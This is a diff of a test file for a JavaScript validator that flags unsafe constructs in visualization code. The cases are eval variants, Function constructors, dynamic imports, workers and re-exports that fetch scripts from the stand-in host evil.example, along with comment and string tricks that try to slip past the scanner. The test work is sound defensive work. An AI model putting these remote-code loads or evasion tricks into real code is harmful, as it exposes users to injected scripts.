@@ -32,12 +32,34 @@ describe("findVizSourceViolations", () => {
   });
 
   it.each([
-    ["eval", "eval('x')"],
-    ["function-constructor", "Function('return 1')"],
-    ["dynamic-import", "import('https://evil.example/x.js')"],
     ["static-import", "import foo from './other.js'"],
     ["static-import", 'import "./other.js"'],
-    ["static-import", "import { create } from './other.js'"],
+    ["static-import", "import { helper } from './other.js'"],
+    ["static-import", 'export * from "https://evil.example/x.js"'],
+    ["static-import", 'export * as evil from "https://evil.example/x.js"'],
+    ["static-import", 'export { x } from "https://evil.example/x.js"'],
+    ["import-meta", "export const where = import.meta.url"],
+  ])("rejects top-level %s: %s", (id, statement) => {
+    const source = `${statement};\nexport function create() { return { render() {} }; }`;
+    const hits = findVizSourceViolations(source);
+    expect(hits.map((h) => h.id)).toContain(id);
+  });
+
+  it.each([
+    ["eval", "eval('x')"],
+    ["eval", "(0, eval)('x')"],
+    ["eval", "self.eval('x')"],
+    ["eval", "globalThis['eval']('x')"],
+    ["eval", "const run = eval"],
+    ["function-constructor", "Function('return 1')"],
+    ["function-constructor", "new self.Function('return 1')"],
+    ["dynamic-import", "import('https://evil.example/x.js')"],
+    ["dynamic-import", "import /* hi */ ('https://evil.example/x.js')"],
+    [
+      "dynamic-import",
+      "import('asset://localhost/Users/me/x.json', { with: { type: 'json' } })",
+    ],
+    ["import-meta", "const u = import.meta.url"],
     ["importScripts", "importScripts('https://evil.example/x.js')"],
     ["worker", "new Worker('https://evil.example/w.js')"],
     ["shared-worker", "new SharedWorker('https://evil.example/w.js')"],
@@ -47,6 +69,46 @@ describe("findVizSourceViolations", () => {
     const source = `export function create() { ${snippet}; return { render() {} }; }`;
     const hits = findVizSourceViolations(source);
     expect(hits.map((h) => h.id)).toContain(id);
+  });
+
+  it.each([
+    [
+      "a block-comment opener inside a string",
+      `const a = "/*"; import("https://evil.example/x.js"); const b = "*/";`,
+    ],
+    [
+      "a line-comment marker inside a string",
+      `const a = "//"; import("https://evil.example/x.js");`,
+    ],
+    [
+      "a template literal holding a comment opener",
+      "const a = `/*`; import('https://evil.example/x.js'); const b = `*/`;",
+    ],
+    [
+      "a regex literal holding a comment opener",
+      "const r = /[/*]/; import('https://evil.example/x.js'); const s = '*/';",
+    ],
+  ])("is not fooled by %s", (_label, snippet) => {
+    const source = `export function create() { ${snippet} return { render() {} }; }`;
+    expect(findVizSourceViolations(source).map((h) => h.id)).toContain(
+      "dynamic-import",
+    );
+  });
+
+  it("ignores banned names inside strings and object keys", () => {
+    expect(
+      findVizSourceViolations(`
+        const labels = { eval: "eval(", Worker: "import('x')" };
+        class Shape { Function() {} }
+        export function create() { return { render() { return labels; } }; }
+      `),
+    ).toEqual([]);
+  });
+
+  it("rejects source that does not parse as a module", () => {
+    expect(
+      findVizSourceViolations("export function create( {").map((h) => h.id),
+    ).toEqual(["parse"]);
   });
 
   it("does not treat 'important' as an import statement", () => {
